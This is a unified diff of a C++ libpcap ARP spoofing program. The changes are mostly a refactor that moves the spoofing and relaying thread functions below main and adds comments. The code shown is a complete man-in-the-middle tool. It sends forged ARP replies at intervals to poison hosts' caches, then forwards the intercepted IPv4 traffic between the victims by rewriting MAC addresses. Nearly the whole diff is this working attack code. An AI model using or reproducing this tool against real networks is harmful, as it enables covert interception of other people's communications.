@@ -28,143 +28,9 @@ static vector<MAC_addr> sender_macs;
 static vector<MAC_addr> target_macs;
 static int log_level = LOG_LEVEL_INFO;
 
-void thread_spoofing() {
-	while(true) {
-		// printf("Arp spoofing\n");
-		for (u_int i=0; i < sender_macs.size(); i++) {
-			send_arp_reply(handle, my_mac_addr, sender_macs[i], target_ips[i], sender_ips[i]);
-		}
-		sleep(ARP_SPOOFING_PERIOD);
-	}
-}
-void thread_relaying() {
-	struct pcap_pkthdr* header_ptr;
-	const u_char *pkt_data;
-	struct ether_header* eth_hdr;
-	struct ip* ip_hdr;
-	while(true) {
-		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
-		if (status == 0) {
-			//no pcaket
-			continue;
-		} else if (status == -1) {
-			fprintf(stderr, "While packet relaying, something wrong on Interface: %s\n", pcap_geterr(handle));
-			return;
-		} else if (status == -2) {
-			fprintf(stderr, "While packet relaying, unexpected accident occured\n");
-			return;
-		}
-		eth_hdr = (struct ether_header*)pkt_data;
+void thread_spoofing();
+void thread_relaying();
 
-		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
-			ip_hdr = (struct ip*)(pkt_data + sizeof(struct ether_header));
-		} else {
-			//not IP protocol
-			continue;
-		}
-		if (ip_hdr->ip_v != 4) {
-			//IP version it not 4
-			continue;
-		}
-		IPv4_addr dst_ip;
-		IPv4_addr src_ip;
-		dst_ip.parse_mem((char*)&ip_hdr->ip_dst);
-		// cout << "dest IP: ";
-		// dst_ip.ascii_dump();
-		// cout << endl;
-		src_ip.parse_mem((char*)&ip_hdr->ip_src);
-		// cout << "src IP: ";
-		// src_ip.ascii_dump();
-		// cout << endl;
-		if (!my_ip_addr.is_equal(dst_ip)) { //its not for mine
-			if (log_level >= LOG_LEVEL_DEBUG) {
-				cout << "This pack is not for me dest IP: ";
-				dst_ip.ascii_dump();
-				cout << endl;
-				cout << "src IP: ";
-				src_ip.ascii_dump();
-				cout << endl;
-			}
-			for (u_int i = 0; i < sender_ips.size(); i++) { //src ip is in sender list
-				auto sender_ip = sender_ips[i];
-				if (sender_ip.is_equal(src_ip)) {
-					MAC_addr dst_mac = target_macs[i]; //got the real mac address
-					cout << "Real dest MAC: ";
-					dst_mac.hex_dump();
-					cout << endl;
-					dst_mac.write_mem(eth_hdr->ether_dhost);
-					my_mac_addr.write_mem(eth_hdr->ether_shost);
-					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
-						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
-					} else {
-						if (log_level >= LOG_LEVEL_DEBUG) {
-							printf("Packet relay Success!\n");
-						}
-					}
-					break;
-					// for (int i = 0; i < header_ptr->len; i++) {
-					// 	if ( (*(pkt_data + i ) & 0xff) >= 0x10) {
-					// 		printf("%x ", *(pkt_data + i) & 0xff);
-					// 	} else {
-					// 		printf("0%x ", *(pkt_data + i) & 0xff);
-					// 	}
-					// 	if (i % 16 == 15) {
-					// 		putchar('\n');
-					// 	}
-					// 	 else if (i % 8 == 7) {
-					// 		putchar(' ');
-					// 	}
-					// }
-					// putchar('\n');
-					// break;
-				}
-				if (sender_ip.is_equal(dst_ip)) {
-					//return packet
-					MAC_addr dst_mac = sender_macs[i];
-					cout << "Real dest MAC: ";
-					dst_mac.hex_dump();
-					cout << endl;
-					dst_mac.write_mem(eth_hdr->ether_dhost);
-					my_mac_addr.write_mem(eth_hdr->ether_shost);
-					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
-						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
-					} else {
-						if (log_level >= LOG_LEVEL_DEBUG) {
-							printf("Packet relay Success!\n");
-						}
-					}
-					break;
-				}
-			}
-		}
-
-		// for (int i = 0; i < header_ptr->len; i++) {
-		// 	if ( (*(pkt_data + i ) & 0xff) >= 0x10) {
-		// 		printf("%x ", *(pkt_data + i) & 0xff);
-		// 	} else {
-		// 		printf("0%x ", *(pkt_data + i) & 0xff);
-		// 	}
-		// 	if (i % 16 == 15) {
-		// 		putchar('\n');
-		// 	}
-		// 	 else if (i % 8 == 7) {
-		// 		putchar(' ');
-		// 	}
-		// }
-		// putchar('\n');
-
-		// IPv4_addr tmp_ip;
-		// tmp_ip.parse_mem(arp_hdr->arp_spa);
-		// cout << "sender IP addr -> "; tmp_ip.ascii_dump();
-		// cout << endl;
-		// if ( !sip.is_equal( tmp_ip ) ) {
-		// 	//printf("ip is not matched\n");
-		// 	//Sender IP addr not matched
-		// 	continue;
-		// }
-		// ret.parse_mem(arp_hdr->arp_sha);
-	}
-}
 int main(int argc, char *argv[]) {
 	char *log_level_str = getenv("LOG_LEVEL");
 	
@@ -225,6 +91,7 @@ int main(int argc, char *argv[]) {
 	if (log_level >= LOG_LEVEL_DEBUG) {
 		printf("Gathering MAC address of sender IP addr owner...\n");
 	}
+	//Gathering sender's MAC address
 	for (u_int i = 0; i < sender_ips.size(); i++) {
 		auto sender_ip = sender_ips[i];
 		if (log_level >= LOG_LEVEL_DEBUG) {
@@ -265,6 +132,7 @@ int main(int argc, char *argv[]) {
 		}
 	}
 
+	//Gathering target's MAC address
 	for (u_int i = 0; i < target_ips.size(); i++) {
 		auto target_ip = target_ips[i];
 		if (log_level >= LOG_LEVEL_DEBUG) {
@@ -304,10 +172,104 @@ int main(int argc, char *argv[]) {
 			cout << endl;
 		}
 	}
-
 	//Gathering Sender's MAC address procedure finish
+
 	thread spoofing_thread(thread_spoofing);
 	thread relaying_thread(thread_relaying);
 	spoofing_thread.join();
 	relaying_thread.join();
+
+	return EXIT_SUCCESS;
+}
+
+void thread_spoofing() {
+	while(true) {
+		// printf("Arp spoofing\n");
+		for (u_int i=0; i < sender_macs.size(); i++) {
+			send_arp_reply(handle, my_mac_addr, sender_macs[i], target_ips[i], sender_ips[i]);
+		}
+		sleep(ARP_SPOOFING_PERIOD);
+	}
+}
+void thread_relaying() {
+	struct pcap_pkthdr* header_ptr;
+	const u_char *pkt_data;
+	struct ether_header* eth_hdr;
+	struct ip* ip_hdr;
+	while(true) {
+		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
+		if (status == 0) {
+			//no pcaket
+			continue;
+		} else if (status == -1) {
+			fprintf(stderr, "While packet relaying, something wrong on Interface: %s\n", pcap_geterr(handle));
+			return;
+		} else if (status == -2) {
+			fprintf(stderr, "While packet relaying, unexpected accident occured\n");
+			return;
+		}
+		eth_hdr = (struct ether_header*)pkt_data;
+
+		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
+			ip_hdr = (struct ip*)(pkt_data + sizeof(struct ether_header));
+		} else {
+			//not IP protocol
+			continue;
+		}
+		if (ip_hdr->ip_v != 4) {
+			//IP version it not 4
+			continue;
+		}
+		IPv4_addr dst_ip;
+		IPv4_addr src_ip;
+		dst_ip.parse_mem((char*)&ip_hdr->ip_dst);
+		src_ip.parse_mem((char*)&ip_hdr->ip_src);
+		if (!my_ip_addr.is_equal(dst_ip)) { //its not for mine
+			if (log_level >= LOG_LEVEL_DEBUG) {
+				cout << "This pack is not for me dest IP: ";
+				dst_ip.ascii_dump();
+				cout << endl;
+				cout << "src IP: ";
+				src_ip.ascii_dump();
+				cout << endl;
+			}
+			for (u_int i = 0; i < sender_ips.size(); i++) { //src ip is in sender list
+				auto sender_ip = sender_ips[i];
+				if (sender_ip.is_equal(src_ip)) {
+					//sender -> target packet
+					MAC_addr dst_mac = target_macs[i]; //got the real mac address
+					cout << "Real dest MAC: ";
+					dst_mac.hex_dump();
+					cout << endl;
+					dst_mac.write_mem(eth_hdr->ether_dhost);
+					my_mac_addr.write_mem(eth_hdr->ether_shost);
+					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
+						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
+					} else {
+						if (log_level >= LOG_LEVEL_DEBUG) {
+							printf("Packet relay Success!\n");
+						}
+					}
+					break;
+				}
+				if (sender_ip.is_equal(dst_ip)) {
+					//target -> sender packet
+					MAC_addr dst_mac = sender_macs[i];
+					cout << "Real dest MAC: ";
+					dst_mac.hex_dump();
+					cout << endl;
+					dst_mac.write_mem(eth_hdr->ether_dhost);
+					my_mac_addr.write_mem(eth_hdr->ether_shost);
+					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
+						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
+					} else {
+						if (log_level >= LOG_LEVEL_DEBUG) {
+							printf("Packet relay Success!\n");
+						}
+					}
+					break;
+				}
+			}
+		}
+	}
 }
